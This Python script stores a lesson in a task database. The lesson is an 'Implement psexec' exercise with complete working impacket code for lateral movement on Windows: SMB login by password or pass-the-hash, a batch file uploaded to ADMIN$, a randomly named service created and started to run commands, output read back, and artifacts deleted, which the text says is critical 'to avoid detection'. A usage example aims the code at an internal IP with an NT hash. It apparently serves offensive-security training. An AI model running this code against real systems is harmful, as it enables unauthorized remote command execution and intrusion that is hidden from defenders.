#!/usr/bin/env python3
"""Update individual task details."""

import sqlite3
import sys
from pathlib import Path

DB_PATH = Path(__file__).parent.parent / "data" / "quest-log.db"

def update_task(task_id: int, details: str):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("UPDATE tasks SET details = ? WHERE id = ?", (details, task_id))
    conn.commit()

    # Verify
    cursor.execute("SELECT title, length(details) FROM tasks WHERE id = ?", (task_id,))
    row = cursor.fetchone()
    conn.close()

    if row:
        print(f"Updated task {task_id}: '{row[0]}' - {row[1]} chars")
    else:
        print(f"Task {task_id} not found")

# Task 1955: Implement psexec
TASK_1955 = """## Overview

PsExec enables remote command execution by creating a Windows service on the target system. It uploads an executable, creates/starts a service to run it, captures output via named pipes, and cleans up afterward. This is a fundamental lateral movement technique.

### PsExec Flow

```
Attacker                              Target
   │                                     │
   │── SMB Connect (445) ───────────────▶│
   │── Upload exe to ADMIN$ ───────────▶│ C:\\Windows\\svcexe.exe
   │                                     │
   │── SVCCTL: CreateService ───────────▶│ Create "PSEXEC" service
   │── SVCCTL: StartService ────────────▶│ Service runs command
   │                                     │
   │◀── Named Pipe: stdout/stderr ───────│ \\\\pipe\\svcctl
   │                                     │
   │── SVCCTL: DeleteService ───────────▶│ Cleanup
   │── SMB: Delete exe ─────────────────▶│ Remove binary
   │                                     │
```

### Implementation

```python
import os
import random
import string
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.dtypes import NULL

class PsExec:
    \"\"\"Remote command execution via service creation\"\"\"

    def __init__(self, target: str, username: str, password: str = None,
                 nt_hash: str = None, domain: str = ''):
        self.target = target
        self.username = username
        self.password = password
        self.nt_hash = nt_hash
        self.domain = domain
        self.smb = None
        self.service_name = self._random_name()

    def _random_name(self, length: int = 8) -> str:
        return ''.join(random.choices(string.ascii_letters, k=length))

    def connect(self) -> bool:
        \"\"\"Establish SMB connection\"\"\"
        try:
            self.smb = SMBConnection(self.target, self.target)

            if self.nt_hash:
                lmhash, nthash = '', self.nt_hash
                self.smb.login(self.username, '', self.domain, lmhash, nthash)
            else:
                self.smb.login(self.username, self.password, self.domain)

            return True
        except Exception as e:
            print(f"Connection failed: {e}")
            return False

    def execute(self, command: str, output: bool = True) -> str:
        \"\"\"Execute command on remote system\"\"\"

        # Generate unique names
        exe_name = f"{self._random_name()}.exe"
        bat_name = f"{self._random_name()}.bat"
        output_file = f"{self._random_name()}.txt"

        # Create batch file that runs command and captures output
        if output:
            bat_content = f"@echo off\\n{command} > %TEMP%\\\\{output_file} 2>&1".encode()
        else:
            bat_content = f"@echo off\\n{command}".encode()

        try:
            # Upload batch file to ADMIN$
            self.smb.putFile('ADMIN$', f'Temp\\\\{bat_name}', bat_content)

            # Connect to Service Control Manager
            rpc = transport.DCERPCTransportFactory(
                f'ncacn_np:{self.target}[\\\\pipe\\\\svcctl]'
            )
            rpc.set_smb_connection(self.smb)

            dce = rpc.get_dce_rpc()
            dce.connect()
            dce.bind(scmr.MSRPC_UUID_SCMR)

            # Open SCM with create rights
            scm_handle = scmr.hROpenSCManagerW(
                dce,
                self.target,
                NULL,
                scmr.SC_MANAGER_CREATE_SERVICE
            )['lpScHandle']

            # Create service
            service_path = f'%ComSpec% /c %SystemRoot%\\\\Temp\\\\{bat_name}'

            try:
                scmr.hRCreateServiceW(
                    dce,
                    scm_handle,
                    self.service_name,
                    self.service_name,
                    lpBinaryPathName=service_path,
                    dwStartType=scmr.SERVICE_DEMAND_START
                )
            except Exception as e:
                if 'ERROR_SERVICE_EXISTS' in str(e):
                    pass  # Service exists, try to use it
                else:
                    raise

            # Open service handle
            service_handle = scmr.hROpenServiceW(
                dce,
                scm_handle,
                self.service_name
            )['lpServiceHandle']

            # Start service (executes our command)
            try:
                scmr.hRStartServiceW(dce, service_handle)
            except Exception:
                pass  # Service may return error but command still runs

            # Wait for execution
            import time
            time.sleep(2)

            # Read output if requested
            result = ""
            if output:
                try:
                    output_data = []
                    self.smb.getFile(
                        'ADMIN$',
                        f'Temp\\\\{output_file}',
                        lambda x: output_data.append(x)
                    )
                    result = b''.join(output_data).decode('utf-8', errors='replace')
                except:
                    result = "(no output captured)"

            # Cleanup
            self._cleanup(dce, scm_handle, service_handle, bat_name, output_file)

            return result

        except Exception as e:
            return f"Execution failed: {e}"

    def _cleanup(self, dce, scm_handle, service_handle, bat_name, output_file):
        \"\"\"Remove service and uploaded files\"\"\"
        try:
            scmr.hRControlService(dce, service_handle, scmr.SERVICE_CONTROL_STOP)
        except:
            pass

        try:
            scmr.hRDeleteService(dce, service_handle)
            scmr.hRCloseServiceHandle(dce, service_handle)
        except:
            pass

        try:
            self.smb.deleteFile('ADMIN$', f'Temp\\\\{bat_name}')
            self.smb.deleteFile('ADMIN$', f'Temp\\\\{output_file}')
        except:
            pass


# Usage
psexec = PsExec(
    target="192.168.1.100",
    username="admin",
    nt_hash="31d6cfe0d16ae931b73c59d7e0c089c0",
    domain="CORP"
)

if psexec.connect():
    output = psexec.execute("whoami /all")
    print(output)
```

### Key Concepts

- **ADMIN$**: Administrative share pointing to C:\\Windows, requires admin
- **SVCCTL**: RPC interface for Service Control Manager operations
- **Service Binary Path**: Can use cmd.exe /c for simple commands
- **Named Pipes**: Used for interactive I/O with service binary
- **Cleanup**: Critical to remove service and files to avoid detection

### Practice Tasks

- [ ] Implement SMB connection with pass-the-hash support
- [ ] Upload files to ADMIN$ share
- [ ] Connect to SVCCTL RPC interface
- [ ] Create Windows service with custom binary path
- [ ] Start service and capture execution
- [ ] Read command output from temp file
- [ ] Implement proper cleanup (delete service, files)
- [ ] Add interactive shell via named pipes

### Completion Criteria

- [ ] Execute commands on remote Windows system
- [ ] Capture stdout/stderr output
- [ ] Works with password and NTLM hash
- [ ] Cleanup removes all artifacts
- [ ] Handle service creation errors gracefully"""

if __name__ == "__main__":
    if len(sys.argv) > 1:
        task_id = int(sys.argv[1])
    else:
        task_id = 1955

    update_task(task_id, TASK_1955)
